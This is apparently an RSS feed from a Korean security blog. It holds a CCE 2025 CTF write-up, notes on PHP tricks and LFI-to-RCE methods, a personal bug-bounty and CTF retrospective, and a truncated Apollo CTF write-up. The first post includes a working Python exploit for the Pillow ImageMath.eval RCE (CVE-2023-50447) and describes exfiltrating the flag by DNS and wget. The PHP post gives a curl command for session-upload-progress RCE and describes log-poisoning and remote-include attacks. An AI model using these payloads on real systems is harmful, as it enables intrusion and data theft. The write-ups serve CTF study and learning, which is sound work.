<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>CCE Quals Write-Up</title><link>https://itznullbyte.github.io/posts/2025_cce/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/2025_cce/</guid><description>6th with Team: 해킹의 정석</description><pubDate>Tue, 19 Aug 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;img src=&quot;./scoreboard.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;YISF 본선 전날에 CCE 예선을 나갔다.&lt;br /&gt;
해킹의 정석팀으로 참여해서 6등으로 본선을 가게 되었다.&lt;br /&gt;
올해 목표가 메이저 대회 본선 진출과 수상이었는데 비록 코게는 못갔지만 CCE 본선에 갈 수 있게 되어 다행이다&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Solves&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;First Day&lt;/li&gt;
&lt;li&gt;Discount Coupon&lt;/li&gt;
&lt;li&gt;Photo Editing&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;First Day&lt;/h2&gt;
&lt;p&gt;방화벽을 우회해서 XSS 하는 문제였다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;firewall.sh&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env bash
set -euo pipefail

iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP

iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT

iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j ACCEPT
iptables -A OUTPUT -p udp -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;TCP로 요청 나가는걸 막고 있으므로 UDP나 DNS로 leak 해야겠단 생각을 했다&lt;/p&gt;
&lt;p&gt;마침 팀원이 전에 학교 프로젝트로 DNS 서버 구축해둔게 있었고 그거 가지고 플래그 leak했다&lt;/p&gt;
&lt;h2&gt;Discount Coupon&lt;/h2&gt;
&lt;p&gt;Golang으로 쓰여진거라 쫄았는데 생각보다 별거 없었다&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if formValues.Has(&quot;coupon&quot;) {
  for range formValues[&quot;coupon&quot;] {
    if user.CouponUsed {
      tx.Rollback()
      var prods []models.Product
      config.DB.Find(&amp;amp;prods)
      c.HTML(400, &quot;products.html&quot;, gin.H{
        &quot;msg&quot;:        &quot;이미 쿠폰을 사용하셨습니다.&quot;,
        &quot;products&quot;:   prods,
        &quot;couponLeft&quot;: !user.CouponUsed,
        &quot;balance&quot;:    user.Balance,
        &quot;username&quot;:   user.Username,
      })
      return
    }
    price = price / 2
  }
  user.CouponUsed = true
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;취약점이 대놓고 보인다&lt;/p&gt;
&lt;p&gt;바디에 들어간 coupon 수만큼 루프돌면서 적용해주고 있으므로 coupon 값 중복해서 넣으면 다 적용시켜 계속 할인된다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;product_id=2&amp;amp;coupon=on&amp;amp;coupon=on&amp;amp;coupon=on&amp;amp;coupon=on&amp;amp;coupon=on&amp;amp;coupon=on
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;cce2025{52eb1c95630d4d8ed303cf44d8ac2b8e46b15501b23d379a7238118b754a55e6}&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;Photo Editing&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;def apply_transform(transform_name, filenames, user_uuid, options=None):
    &quot;&quot;&quot;Apply a specific transformation to images and return PIL Image objects.&quot;&quot;&quot;
    images = get_processed_images(filenames, user_uuid)
    if not images:
        return []
    if options is None:
        options = {}

    if transform_name == &apos;rotate&apos;:
        angle = options.get(&apos;angle&apos;, 90)
        return [img.rotate(angle, expand=True) for img in images]
    
    elif transform_name == &apos;composite&apos;:
        if len(images) != 2:
            raise ValueError(&quot;이미지 합성은 반드시 2개의 이미지를 선택해야 합니다.&quot;)
        img1 = images[0]
        img2 = images[1].resize(img1.size)
        return [Image.blend(img1, img2, alpha=0.5)]

    elif transform_name == &apos;append&apos;:
        num_images = len(images)
        if num_images == 0:
            raise ValueError(&quot;이미지를 선택해주세요.&quot;)
        elif num_images &amp;gt; 4:
            raise ValueError(&quot;이미지 조합은 최대 4장까지만 지원합니다.&quot;)

        if num_images == 1:
            return images 
        elif num_images &amp;lt;= 3:
            min_width = min(img.width for img in images)
            resized_images = [img.resize((min_width, int(img.height * min_width / img.width))) for img in images]
            
            total_height = sum(img.height for img in resized_images)
            dst = Image.new(&apos;RGB&apos;, (min_width, total_height))
            
            y_offset = 0
            for img in resized_images:
                dst.paste(img, (0, y_offset))
                y_offset += img.height
            return [dst]
        elif num_images == 4:
            min_size = min(img.width for img in images), min(img.height for img in images)
            resized_images = [img.resize(min_size) for img in images]
            
            dst = Image.new(&apos;RGB&apos;, (min_size[0] * 2, min_size[1] * 2))
            dst.paste(resized_images[0], (0, 0))
            dst.paste(resized_images[1], (min_size[0], 0))
            dst.paste(resized_images[2], (0, min_size[1]))
            dst.paste(resized_images[3], (min_size[0], min_size[1]))
            return [dst]

    elif transform_name == &apos;contour&apos;:
        return [img.filter(ImageFilter.CONTOUR) for img in images]

    elif transform_name == &apos;solarize&apos;:
        threshold = options.get(&apos;threshold&apos;, 128)
        return [ImageOps.solarize(img, threshold=threshold) for img in images]

    elif transform_name == &apos;brightness&apos;:
        factor = options.get(&apos;factor&apos;, 1.5)
        return [ImageEnhance.Brightness(img).enhance(factor) for img in images]

    elif transform_name == &apos;grayscale&apos;:
        return [img.convert(&apos;L&apos;) for img in images]

    elif transform_name == &apos;sepia&apos;:
        sepia_matrix = [
            0.393, 0.769, 0.189, 0,
            0.349, 0.686, 0.168, 0,
            0.272, 0.534, 0.131, 0
        ]
        return [img.convert(&quot;RGB&quot;, sepia_matrix) for img in images]

    elif transform_name == &apos;custom_formula&apos;:
        exp = options.get(&apos;expression&apos;)
        if not exp:
            raise ValueError(&quot;Custom formula requires an &apos;expression&apos;.&quot;)
        env = { fname: img for fname, img in zip(filenames, images) }
        try:
            result = ImageMath.eval(exp, env)
            return [result]
        except Exception as e:
            return [None]
    else:
        raise ValueError(f&quot;Unknown transformation: {transform_name}&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;custom_formula에서 &lt;code&gt;ImageMath.eval()&lt;/code&gt;을 사용한다
서버에서 Pillow 10.0.0을 사용하고 있어 &lt;code&gt;CVE-2023-50447&lt;/code&gt;를 트리거 할 수 있다&lt;/p&gt;
&lt;p&gt;CVE 내용을 보자면&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from PIL import Image, ImageMath

image1 = Image.open(&apos;__class__&apos;)
image2 = Image.open(&apos;__bases__&apos;)
image3 = Image.open(&apos;__subclasses__&apos;)
image4 = Image.open(&apos;load_module&apos;)
image5 = Image.open(&apos;system&apos;)


expression = f&quot;().__class__.__bases__[0].__subclasses__()[84].load_module(&apos;os&apos;).system(&apos;calc&apos;)&quot;

environment = {
    image1.filename: image1,
    image2.filename: image2,
    image3.filename: image3,
    image4.filename: image4,
    image5.filename: image5
}

ImageMath.eval(expression, environment)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;특정한 이름을 가진 파일들을 &lt;code&gt;ImageMath.eval()&lt;/code&gt;의 두번째 인자로 넣어주면 RCE가 가능하다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests
from bs4 import BeautifulSoup
import uuid
import os

url = &apos;http://3.38.167.161:5000&apos;
board_id = &apos;c3200d82-e892-4632-8dc5-bc225814f28d&apos;
username = &apos;nullbyte&apos;
password = &apos;123456&apos;
image_paths = [&apos;__class__.png&apos;, &apos;__bases__.png&apos;, &apos;__subclasses__.png&apos;, &apos;load_module.png&apos;, &apos;system.png&apos;]

s = requests.Session()

def get_csrf():
    res = s.get(f&apos;{url}/auth/login&apos;)
    soup = BeautifulSoup(res.text, &apos;html.parser&apos;)
    token = soup.find(&apos;input&apos;, {&apos;name&apos;: &apos;csrf_token&apos;})[&apos;value&apos;]
    return token

login_data = {
    &apos;username&apos;: username,
    &apos;password&apos;: password,
    &apos;csrf_token&apos;: get_csrf()
}

s.post(f&apos;{url}/auth/login&apos;, data=login_data)

res = s.get(f&apos;{url}/board/{board_id}/create&apos;)
soup = BeautifulSoup(res.text, &apos;html.parser&apos;)
csrf_token = soup.find(&apos;input&apos;, {&apos;name&apos;: &apos;csrf_token&apos;})[&apos;value&apos;]

files = []
for path in image_paths:
    ext = path.rsplit(&apos;.&apos;, 1)[1].lower()
    new_name = path.rsplit(&apos;.&apos;, 1)[0]
    files.append((&apos;images&apos;, (new_name, open(path, &apos;rb&apos;), &apos;image/jpeg&apos;)))

data = {
    &apos;csrf_token&apos;: csrf_token,
    &apos;title&apos;: &apos;nullbyte&apos;,
    &apos;content&apos;: &apos;안녕&apos;
}

res = s.post(f&apos;{url}/board/{board_id}/create&apos;, data=data, files=files)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;이미지 5개 업로드하고&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./poc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Dockerfile에 wget이 있어서 그거 가지고 플래그 보냈다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cce2025{1dd859f7e538fef324b4ef83f5004433c590c253a5750ac6667ba1abc95789adcf93595acfd927f2694514dace1f82f9b4cea0}&lt;/code&gt;&lt;/p&gt;
</content:encoded></item><item><title>PHP Tricks &amp; RCE 기법 정리 (해킹하는 부엉이들)</title><link>https://itznullbyte.github.io/posts/php_in_ctf/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/php_in_ctf/</guid><description> </description><pubDate>Tue, 05 Aug 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/watch?v=qXR8QyvGscM&amp;amp;list=PLokTrj1EwOzww676mj_wIP7poVTq8oWyP&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
&lt;p&gt;:::note
해킹하는 부엉이 - [초보자를 위한 PHP Tricks + RCE 기법들 소개] 발표를 정리하여 작성했습니다.&lt;br /&gt;
해당 발표의 발표자이신 &lt;a href=&quot;https://one3147.tistory.com/&quot;&gt;&lt;code&gt;one3147&lt;/code&gt;&lt;/a&gt;님의 동의를 받고 작성하는 글입니다
:::&lt;/p&gt;
&lt;p&gt;요즘 CTF 나갈 때마다 느끼는 생각이 &lt;code&gt;nodejs&lt;/code&gt;말고 다른 환경이 나오면 무기력해진다는 것이다.
nodejs는 계속 다뤄왔으니 해킹을 시작했을때부터 접근하기 쉬웠고 꽤 난이도 있는 문제들도 많이 풀어왔다.&lt;br /&gt;
그러나 php랑 python으로 작성된 백엔드 바이너리를 볼 때마다 벽을 느끼곤한다&lt;/p&gt;
&lt;p&gt;어떻게 보완할지 고민하던 와중 TeamH4C에서 진행하는 &lt;code&gt;해킹하는 부엉이들&lt;/code&gt;에서 &lt;code&gt;One&lt;/code&gt;님이 진행하신 해당 발표를 접하게 되었고 정리해보려한다&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;PHP Tricks?&lt;/h3&gt;
&lt;p&gt;php에서는 (N)e(K) 형태의 문법을 지원한다. 이게 뭐냐면 대충 &lt;code&gt;2e12&lt;/code&gt;로 표현하면 php가 $2 \cdot (10^{12})$ 같이 해석한다는거다.
이게 어떤식으로 악용 가능하냐면&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if(md5(&apos;QNKCDZO&apos;) == 0)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;위와 같이 해시를 검증한다면 &lt;code&gt;0e8304...&lt;/code&gt;이 되고 $0 \cdot 10^{8304...}$로 해석되어 &lt;code&gt;True&lt;/code&gt;를 반환하게 된다.&lt;/p&gt;
&lt;p&gt;이게 PHP 느슨한 비교를 사용하는 기법이랑 이어질 수가 있는데&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if(&apos;1e2&apos; == 100) {}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;문자열 삽입 -&amp;gt; number 타입과 비교 -&amp;gt; 1e2가 100으로 해석&lt;/p&gt;
&lt;h3&gt;PHP 문법&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;function sayHi() {
  echo &apos;hi&apos;
}

&apos;hi&apos;();
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;php에서는 문자열 뒤에다 &lt;code&gt;()&lt;/code&gt;넣어서 호출해도 함수가 호출된다고 한다.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;preg_&lt;/code&gt;로 시작하는 함수들은 정규표현식을 기반으로 구현된다. 따라서 ReDos 가능성이 존재한다&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;PHP LFI, RCE&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
  include $_GET[&apos;path&apos;]
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;CTF하다보면 이런 코드 한 번쯤은 봤을 것이다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;file:///&lt;/code&gt; 프로토콜이랑 &lt;code&gt;php wrapper&lt;/code&gt;들을 허용해서 LFI가 발생한다.
이는 이후 설명할 LFI to RCE로 연계 가능하다&lt;/p&gt;
&lt;p&gt;그리고 자주 보이던 &lt;code&gt;allow_url_includes&lt;/code&gt;가 켜져있으면 이런 코드에서 http 프로토콜 또한 허용해 include 한다.
&lt;code&gt;allow_url_includes = On&lt;/code&gt; 이라면 원격에 있는 웹셸파일을 포함시켜 RCE하는 식의 기법도 있다&lt;/p&gt;
&lt;h4&gt;Log Poisoning RCE&lt;/h4&gt;
&lt;p&gt;LOG 파일에 payload를 주입해 LFI로 파일을 불러와 실행시키는 기법이다.
그냥 링크에 때려박으면 인코딩 되어 로그로 쓰여지기에, User Agent 같은 곳에 페이로드 삽입 후 &lt;code&gt;/var/log/apache2/access.log&lt;/code&gt; 로그파일을 불러와 익스한다.&lt;/p&gt;
&lt;p&gt;그러나 일반적으로는 &lt;code&gt;access.log&lt;/code&gt;에 &lt;code&gt;excute perm&lt;/code&gt;이 없어 RCE가 불가하기에 서버에서 파일에 실행 권한을 부여하는 취약점이 있지 않은 이상 트리거가 어렵다&lt;/p&gt;
&lt;h4&gt;PHP Session RCE&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;session&lt;/code&gt; 정보는 &lt;code&gt;/var/lib/php/sessions/session_(session)&lt;/code&gt; 형태로 저장된다.&lt;/p&gt;
&lt;p&gt;id나 password(대부분 해시 되겠지만) 같이 session에 저장되는 정보들에 php payload를 작성하고 &lt;code&gt;LFI&lt;/code&gt;로 해당 파일을 로드한다면 페이로드를 실행할 수 있다&lt;/p&gt;
&lt;h4&gt;PHP Session Upload Progress RCE&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;session.upload_progress.enabled&lt;/code&gt;가 On일 때, 업로드 기능이 있는 엔드포인트에 다음과 같은 명령어를 전송하여 익스한다&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl url.kr/upload.php -H &apos;Cookie: PHPSESSID=mysession&apos; -F &apos;PHP_SESSION_UPLOAD_PROGRESS=(BASE64 ENCODED RCE PAYLOAD)&apos; -F &apos;upload=@/etc/passwd&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;그러면 &lt;code&gt;/var/lib/php/sessions/session_my_sess&lt;/code&gt;가 생성되어 인코딩된 페이로드가 저장되고, 이를 LFI 포인트에서 &lt;code&gt;php://filter/convert.base64-decode/resource=&lt;/code&gt;으로 불러와 &lt;code&gt;RCE&lt;/code&gt; 가능하다&lt;/p&gt;
&lt;p&gt;만약 &lt;code&gt;session.upload_progress.cleanup&lt;/code&gt; 옵션이 켜져있다면 &lt;code&gt;upload progress&lt;/code&gt; 이후 바로 제거되기에 익스할 틈이 안난다
따라서 이땐 Dos등 race condition 가능한 포인트를 찾은 후 큰 파일을 업로드하여 cleanup 타이밍을 지연시켜야한다.&lt;/p&gt;
&lt;h4&gt;PHP + Nginx LFI to RCE&lt;/h4&gt;
&lt;p&gt;https://bierbaumer.net/security/php-lfi-with-nginx-assistance/
이거 읽어보고 적극적으로 활용해보도록 하자&lt;/p&gt;
&lt;h4&gt;Others&lt;/h4&gt;
&lt;p&gt;발표에선 언급 되지 않았으나 몇 개 더 찾아봤다&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;file()&lt;/code&gt;, &lt;code&gt;hash_file()&lt;/code&gt;, &lt;code&gt;file_get_contents()&lt;/code&gt;, &lt;code&gt;copy()&lt;/code&gt; 같은 함수에 값을 넣을 수 있다면 &lt;a href=&quot;https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle&quot;&gt;자료&lt;/a&gt;보고 익스를 시도해보자. &lt;code&gt;error_based&lt;/code&gt;로 세션파일 내용 알아낼 수 있다.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LFI 우회 기법중에 &lt;code&gt;shell.p\\hp&lt;/code&gt; 처럼 &lt;code&gt;\&lt;/code&gt; 두 번 넣으면 우회되는 기법이 있다&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/60fdf3880d3d&quot;&gt;SSU CTF에서 나온 기법인데 이것도 알아두면 좋을거 같다&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;해캠, SSU CTF에서 나왔던 기법이다.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;$_GET[&apos;my_name.kr&apos;];
// https://url?my_name.kr=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;쿼리를 이처럼 받는다면 정상적으로 쿼리를 넣기 힘들 것이다. &lt;code&gt;.&lt;/code&gt;이 &lt;code&gt;_&lt;/code&gt;로 치환되어 해석해 버리기 때문이다.&lt;br /&gt;
&lt;code&gt;_&lt;/code&gt;을 &lt;code&gt;[&lt;/code&gt;로 대체해주자. SSU CTF 당시 어떤분의 설명에 의하면 &lt;code&gt;[&lt;/code&gt;가 &lt;code&gt;_&lt;/code&gt;로 치환되며 내부 조건문을 탈출하고 &lt;code&gt;.&lt;/code&gt;은 건들지 않게 된다고 한다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://url?my[name.kr=1
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;발표에서 BOM Mapping도 나왔는데 나중에 정리해보겠다&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;정말 도움 되었다..! 웹 해킹 공부 시작 초반부터 &lt;code&gt;One&lt;/code&gt;님 블로그 정독하며 공부해왔는데 다시 한 번 감사하다는 말씀 드리고 싶다&lt;/p&gt;
</content:encoded></item><item><title>24, 25년 회고록</title><link>https://itznullbyte.github.io/posts/2024_2025_memory/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/2024_2025_memory/</guid><description> </description><pubDate>Sat, 02 Aug 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;24년 9월&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./neisplus.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;24년도에 본격적으로 버그바운티를 시작했던거 같다.
디코 돌아다니다가 어떤 유저분이 KERIS에서 주최하는 4세대 NEIS Plus 버그바운티 공고를 올리신걸 봤고 카카오 깔짝깔짝 경력도 있던터라 바로 참여해봤다.&lt;/p&gt;
&lt;p&gt;시작한 당일날에 운좋게 취약점을 찾게 되었고 12월에 포상금 받으라고 연락왔다.&lt;br /&gt;
학교에서 메일 온거 보고 하루종일 좋아했던게 기억난다 ㅋㅋ 무려 나이스의 취약점을 내가 찾았다고? 라는 성취감이 꽤 오래 갔던거 같다&lt;/p&gt;
&lt;h2&gt;24년 11월&lt;/h2&gt;
&lt;p&gt;가입만 해놓고 방치해놨던 드림핵에 들어가봤는데 드림핵 5만명 가입 기념 UCC CTF란게 열린다고 했다.&lt;br /&gt;
23년 X-MAS CTF 뭣 모르고 참여했다 한 문제도 못 풀었던게 떠올라 지금의 내가 얼마나 성장했을지 궁금해서 참여해봤다.&lt;br /&gt;
(사실 상품이 푸짐했던게 눈이 가지 않았나 싶다)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./ucc1.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;./ucc2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://dreamhack.io/wargame/challenges/1578&quot;&gt;&lt;code&gt;JS is the best&lt;/code&gt;&lt;/a&gt; 라는 문제 하나를 풀게 되었고 생각보다 높은 등수인 28등으로 마무리했다.&lt;/p&gt;
&lt;p&gt;이걸 기점으로 보안을 본격적으로 공부하게 되었다.&lt;/p&gt;
&lt;h2&gt;24년 12월&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./warp.png&quot; alt=&quot;&quot; /&gt;
보안에 흥미가 생기자마자 경기과학고에서 여는 &lt;code&gt;WaRP CTF&lt;/code&gt; 공고를 보게 되었고 마찬가지로 웹 1솔로 마무리 했다.&lt;br /&gt;
끝나고 얼마 뒤 업솔빙 때린 문제들이 몇 개 있었던지라 꽤 아쉽긴 했다. 20팀 중에 2팀 뽑는 특별상에도 기대를 걸었는데 놓쳐버렸다..ㅎㅎ&lt;/p&gt;
&lt;p&gt;23년 중학교 겨울방학 때 작은 취약점 하나를 카카오에서 찾아 Hall of Fame에 등재 되었었다.
카카오에서 버그바운티 대상을 대폭 증가시킨다는 내용의 안내 메일이 왔었고 그 추가 대상에서 전에 찾아놨던 취약점이 있었던지라 24년도 HoF 올라가겠다고 생각하고 있었다.&lt;/p&gt;
&lt;p&gt;근데 까먹고 있다가 보고서를 안써서 먼저 보고서 제출하신 누군가에게 뺏겨버렸다..&lt;/p&gt;
&lt;h2&gt;25년 1월&lt;/h2&gt;
&lt;p&gt;고1 겨울방학을 시작한 1월엔 꽤 시도해본게 많았다
일단 첫번째로 CTF와 드림핵 풀이를 시작했다.&lt;/p&gt;
&lt;p&gt;버그바운티는 해봤지만 다양한 웹해킹 기법에 대한 이해도는 전혀 없는 상태였다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./dreamhack_lvl_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;드림핵 &lt;code&gt;Web Begginer, 1레벨&lt;/code&gt; 위주로 풀려고 노력했다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./soongsil.png&quot; alt=&quot;&quot; /&gt;
작은 해킹 스터디에 들어가서 팀원들과 숭실대 &lt;code&gt;SSU CTF&lt;/code&gt;에 나갔다.&lt;br /&gt;
대학 vs 일반부로만 구분되었기에 일반부에 중고등학생과 성인들이 모두 포함되어서 더 빡셌던거 같다.
6시간 풀로 뛰어서 &lt;code&gt;100pt&lt;/code&gt;짜리 문제들은 전부 푸는데 성공했다.&lt;/p&gt;
&lt;p&gt;결국 종합 28등 일반부 17등으로 마무리했다. 팀원들이 이미 풀어놓은 문제를 혼자 끙끙거리며 푸는 뻘짓을 하긴했지만.. 뭐 다 같이 열심히했고 고수들 사이에서 28등이면 나쁘지 않은 성과라고 생각한다&lt;/p&gt;
&lt;h2&gt;25년 2월&lt;/h2&gt;
&lt;p&gt;특별한거 없이 해외 CTF랑 워게임만 계속 풀었다.
&lt;img src=&quot;./dreamhack_info.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;./dreamhack_fixer.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;문제 풀고 풀이 적으며 복습하니 어느새 해결사 배너를 얻게 되었다.&lt;/p&gt;
&lt;p&gt;Sechack님, One님, Predic님 등 드림핵 웹 네임드분들의 블로그를 전부 정독했다. 영양가 있는 정보들 많이 얻어갈 수 있었다 (감사합니다..)&lt;/p&gt;
&lt;p&gt;이렇게 웹해킹을 살펴보다보니 접하게 된게 &lt;code&gt;EJS SSTI 취약점&lt;/code&gt;이었다. 이걸로 CTF 언인텐도 나온 사례가 많았고 관련 문제도 드림핵에 있었다.&lt;br /&gt;
원래 주력언어가 nodejs였기에 날잡아서 EJS 모듈을 분석했고 드림핵에서 관련 문제들 보이는건 전부 다 풀어놓았다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./ejs.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;25년 3월&lt;/h2&gt;
&lt;p&gt;기다리던 &lt;code&gt;코드게이트&lt;/code&gt; 예선이 열렸다. 간절히 본선가고 싶었는데 결국 예선에서 떨어졌다..&lt;br /&gt;
할 줄도 모르는 리버싱 문제 풀려다가 대회가 끝나버렸다. 주력분야에 충분히 매달려야겠다는 깨달음을 얻었다 ㅠㅠ&lt;/p&gt;
&lt;h2&gt;25년 4월&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./kakao_hof.png&quot; alt=&quot;&quot; /&gt;
카카오에서 포상금 받으라 연락왔다. 25년 명예의 전당 달달하다.
위험도에 비해선 턱도 없이 적은 금액이었는데 보고서를 유치원생 일기장 같이 쓴 게 한 몫하지 않았나 싶다&lt;/p&gt;
&lt;p&gt;여담으로 4월달에 카카오 취약점 하나 더 찾아서 바운티 넣었는데 지금까지 받은 금액 중 제일 높은 금액을 받게 되었다.
부모님 밥도 사드리고 그럴 생각이다&lt;/p&gt;
&lt;h2&gt;25년 5월&lt;/h2&gt;
&lt;p&gt;버그바운티 팀에서 활동하며 동기부여 받아서 본격적으로 버그바운티를 시작했다
오래 잡고 있던 오픈소스 취약점 하나 찾아서 issue 올리고 MITRE를 통해 CVE 제보했다&lt;/p&gt;
&lt;p&gt;패치데이도 좀 해보고 싶어서 열심히 뛰었고 모두 작은 취약점들이었지만&lt;br /&gt;
Dreamhack과 Goorm에 유의미한 취약점들을 제보할 수 있었다&lt;/p&gt;
&lt;p&gt;드림핵 9레벨도 풀어보고 싶어서 몇주동안 잡았고 &lt;a href=&quot;https://dreamhack.io/wargame/challenges/1056&quot;&gt;&lt;code&gt;leakless&lt;/code&gt;&lt;/a&gt;를 풀어낼 수 있었다. 다시 풀라면 못 풀거 같다 익스짜기 진짜 힘들었다&lt;/p&gt;
&lt;h2&gt;25년 6월&lt;/h2&gt;
&lt;p&gt;시험끝나고 본격적으로 대회들이 몰려오기 시작했다&lt;br /&gt;
처음으로 공지뜬건 아주대 COSS CTF와 Kaist HackQuest였다.&lt;/p&gt;
&lt;p&gt;아주대는 수도권 대상으로만 참여자를 모집했던터라 팀원들과 쉽게 본선을 갈 수 있었다.&lt;br /&gt;
첫 오프라인 CTF였는데 닉네임만 들어본 네임드분들을 실제로 만나니 신기했다. 수상은 못했다&lt;/p&gt;
&lt;p&gt;카이스트는 웹 마지막 문제 풀어서 겨우 본선 진출에 성공했다.&lt;br /&gt;
포너블이랑 리버싱을 진짜 못하는지라 어려울줄 알았는데 3일정도 써서 난이도 있던 웹문제를 풀어냈다&lt;/p&gt;
</content:encoded></item><item><title>CCE Apollo Write-Up</title><link>https://itznullbyte.github.io/posts/cce_apollo/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/cce_apollo/</guid><description> </description><pubDate>Wed, 30 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Solve&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;timetravel&lt;/li&gt;
&lt;li&gt;04-정보자원관리원&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;곧 CCE인데 연습할겸 apollo에 나왔던 문제들 몇 개를 간단하게 write up 작성해보겠다&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;timetravel&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
  $timeInterval = 5;
  
  if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {
      while (ob_get_level()) {
          ob_end_clean();
      }
  
      session_start();
      $_SESSION[&apos;time&apos;] = date(&apos;Y-m-d H:i:s&apos;);
  
      if (!isset($_SESSION[&apos;last_attempt&apos;])) {
          $_SESSION[&apos;last_attempt&apos;] = time();
      } else {
          $currentTime = time();
          $timeElapsed = $currentTime - $_SESSION[&apos;last_attempt&apos;];
  
          if ($timeElapsed &amp;lt; $timeInterval) {
              die(&apos;No Bruteforce&apos;);
          }
  
          $_SESSION[&apos;last_attempt&apos;] = $currentTime;
      }
  
      $passcord = htmlspecialchars($_POST[&apos;passcord&apos;]);
      $passcord = mb_strcut($passcord, 0, 3, &apos;UTF-8&apos;);
      $flag = getenv(&apos;flag&apos;);
  
      ob_start(null, 4096);
      $output = &apos;생략&apos;;
      function safe_iconv($in_charset, $out_charset, $str)
      {
